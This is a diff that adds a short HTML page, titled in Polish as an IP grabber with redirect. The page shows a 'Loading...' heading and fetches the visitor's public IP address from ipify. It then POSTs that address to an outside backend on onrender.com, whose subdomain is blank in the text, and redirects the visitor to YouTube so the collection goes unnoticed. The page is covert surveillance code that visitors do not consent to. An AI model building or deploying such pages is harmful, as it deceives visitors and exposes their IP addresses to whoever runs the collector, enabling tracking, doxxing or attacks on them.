@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><title>IP Grabber z przekierowaniem</title></head>
+<body>
+  <h1>Ładuję...</h1>
+
+  <script>
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        // Wysyłamy IP do backendu
+        fetch('https://.onrender.com/save-ip', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ip: data.ip })
+        })
+        .then(() => {
+          // Po wysłaniu IP przekieruj na YouTube
+          window.location.href = "https://youtube.com";
+        })
+        .catch(() => {
+          // Jeśli wysyłanie nie pójdzie, też przekieruj
+          window.location.href = "https://youtube.com";
+        });
+      })
+      .catch(() => {
+        // Jeśli pobranie IP nie zadziała, też przekieruj
+        window.location.href = "https://youtube.com";
+      });
+  </script>
+</body>
+</html>
